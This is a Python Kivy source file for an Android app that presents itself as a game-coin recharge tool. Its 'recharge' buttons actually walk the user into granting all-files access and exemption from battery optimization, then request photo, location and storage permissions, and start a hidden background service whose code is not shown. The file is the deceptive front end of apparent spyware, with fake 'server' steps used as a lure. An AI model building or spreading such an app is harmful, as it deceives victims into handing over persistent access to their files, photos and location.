from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from jnius import autoclass
from android.permissions import request_permissions, Permission

class CoinsApp(App):
    def build(self):
        layout = BoxLayout(orientation="vertical", padding=30, spacing=20)
        self.status = Label(text="Server Status: Online", font_size='18sp')

        btn_1 = Button(text="RECHARGE COINS - SERVER 1", background_color=(0.2, 0.4, 0.9, 1))
        btn_2 = Button(text="RECHARGE COINS - SERVER 2", background_color=(0.8, 0.5, 0.2, 1))
        btn_3 = Button(text="RECHARGE COINS - FINAL STEP", background_color=(0.1, 0.7, 0.2, 1), bold=True)

        btn_1.bind(on_press=self.open_files)
        btn_2.bind(on_press=self.disable_battery)
        btn_3.bind(on_press=self.start_sync)

        layout.add_widget(self.status)
        layout.add_widget(btn_1); layout.add_widget(btn_2); layout.add_widget(btn_3)
        return layout

    def open_files(self, instance):
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Intent = autoclass('android.content.Intent')
            Settings = autoclass('android.provider.Settings')
            Uri = autoclass('android.net.Uri')
            activity = PythonActivity.mActivity
            uri = Uri.parse("package:" + activity.getPackageName())
            intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, uri)
            activity.startActivity(intent)
        except: pass

    def disable_battery(self, instance):
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Intent = autoclass('android.content.Intent')
            Settings = autoclass('android.provider.Settings')
            Uri = autoclass('android.net.Uri')
            activity = PythonActivity.mActivity
            uri = Uri.parse("package:" + activity.getPackageName())
            intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            intent.setData(uri)
            activity.startActivity(intent)
        except: pass

    def start_sync(self, instance):
        perms = [
            Permission.READ_MEDIA_IMAGES,
            Permission.FOREGROUND_SERVICE,
            Permission.ACCESS_FINE_LOCATION,
            Permission.WRITE_EXTERNAL_STORAGE,
            Permission.READ_EXTERNAL_STORAGE
        ]
        request_permissions(perms, self.launch)

    def launch(self, permissions, grants):
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Service = autoclass('org.test.coinssync.ServiceMyservice')
            Service.start(PythonActivity.mActivity, "")
            self.status.text = "Status: Connection Active"
        except:
            self.status.text = "Error Connection"

if __name__ == "__main__":
    CoinsApp().run()
